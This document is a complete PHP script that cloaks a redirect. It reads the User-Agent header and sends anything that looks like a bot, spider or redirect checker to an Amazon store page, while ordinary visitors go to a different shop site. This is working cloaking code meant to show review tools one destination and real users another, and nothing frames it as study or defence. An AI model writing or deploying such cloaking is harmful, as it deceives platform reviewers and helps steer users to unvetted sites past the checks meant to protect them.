<?php
// Enable error reporting for debugging
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Function to handle redirection
function handleRedirection() {
    // Get the User-Agent header and convert it to lowercase
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    
    // Check if the User-Agent is from a redirect checker, bot, or spider
    $isRedirectChecker = preg_match('/checker|bot|spider/', $userAgent);
    
    // Get query parameters
    $queryParams = $_SERVER['QUERY_STRING'];
    
    if ($isRedirectChecker) {
        // Redirect checker sees this URL
        $targetUrl = "https://www.amazon.com/stores/page/E84F360D-47C4-4DB2-BD6A-0A67B2DCD9D5?" . $queryParams;
    } else {
        // Regular visitors see this URL
        $visitorUrl = "https://roastandrelish.store?" . $queryParams;
    }
    
    // Perform the redirection
    header("Location: " . ($isRedirectChecker ? $targetUrl : $visitorUrl), true, 302);
    exit(); // Ensure no further code is executed
}

// Call the redirection function
handleRedirection();
?>
